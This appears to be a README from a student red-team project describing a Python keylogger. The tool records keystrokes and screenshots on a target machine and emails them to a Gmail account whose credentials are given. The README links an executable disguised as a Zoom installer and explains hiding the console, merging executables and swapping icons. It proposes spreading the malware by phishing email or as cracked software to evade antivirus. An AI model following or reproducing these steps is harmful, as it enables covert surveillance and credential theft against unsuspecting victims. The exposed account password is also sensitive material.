# Remote Supervision and Keylogger
> RedTeamGroup3

### Prerequisites
* Windows System
* python3 (Can be downloaded by official website https://www.python.org/downloads/)
* Install pip
    ```
    curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
    python get-pip.py
    ```
* Install pipenv, pyinstaller
    ```
    pip install pipenv 
    pip install pyinstaller
    ```
### Main Program
* Use keylogger.py to let the target machine record the key log and take screenshot. And email the content to our malware email.
* The hacked information will be (default) returned to the email:
    * account: redteamg3@gmail.com
    * password: malware123
* To change the other email for malware receiver, you can change the detail for information delivery in keylogger.py 116-119:
    ```
    acc="redteamg3@gmail.com" # change
    password=“malware123” # change 

    server=smtplib.SMTP_SSL(“smtp.gmail.com”,465)
    ```
### Run
* To run the keylogger(for python), you have to first install the library imported by keylogger.py
    ```
    pip install ...
    ```
* Otherwise, you can just download our demo execution. (here: https://www.mediafire.com/file/szv0frjp84xhvek/Zoom_Installer.exe/file) 
    * Using this way, you do not need to install the imported library.
  
### To make our malware more realistic
* We use pyinstaller to wrap the python code to executive file. 
    ```
    pipenv shell
    pip install ... (all the imported libraries)
    pyinstaller -F keylogger.py    
    // Here change console in keylogger.spec to false
    pyinstaller -D keylogger.spec
    ```
* Use iexpress to merge two executive files.
* Use Resource Hacker to replace the icon(http://www.angusj.com/resourcehacker/)

### Our Demo example
* Maybe by malicious mail, for example...

![](https://i.imgur.com/irPAE4N.png)
  * When entering the hyperlink, it related to our malware download site.
* To be more realistic(to avoid antivirus software), our implementation can be used by pretending some pirated software or cracked version software (for which user may ignore their security)

### For more detail... 
* The ppt can be found here.
https://docs.google.com/presentation/d/1Z3a2mjvvj_Y-gRDuJigGZ3rSlSk8dhra9OGGrdGnrWY/edit?usp=sharing
* Our demo video can be found here.
https://drive.google.com/drive/folders/1iNw1kA_hu1UQ8Gt0F1-gaxU5UGqjPTWk
